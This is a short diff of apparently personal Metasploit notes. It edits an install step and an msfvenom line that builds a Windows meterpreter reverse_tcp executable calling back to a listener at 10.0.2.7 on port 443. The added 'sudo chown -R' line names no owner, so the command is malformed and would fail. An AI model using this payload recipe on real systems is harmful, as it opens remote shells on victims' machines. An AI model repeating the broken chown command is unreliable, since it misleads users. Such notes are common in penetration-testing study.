@@ -6,6 +6,7 @@ Metasploit
 No MacPorts or Homebrew needed.
 Download the latest installer and run: http://osx.metasploit.com
 Answer yes to all the questions.
+sudo chown -R /opt/metasploit-framework/
 /opt/metasploit-framework/bin/msfconsole
 ------------------------------------------------------------------------------------------------------
 
@@ -84,7 +85,7 @@ exploit
 
 msfvenom -p <payload parameter=value> -f <file format> --playform <OS platform> -o <output file>
  
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.7 LPORT=443 -f exe --platform windows -o evil.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.7 LPORT=443 -f exe --platform windows -o payload.exe
 ------------------------------------------------------------------------------------------------------
 
 # psexec
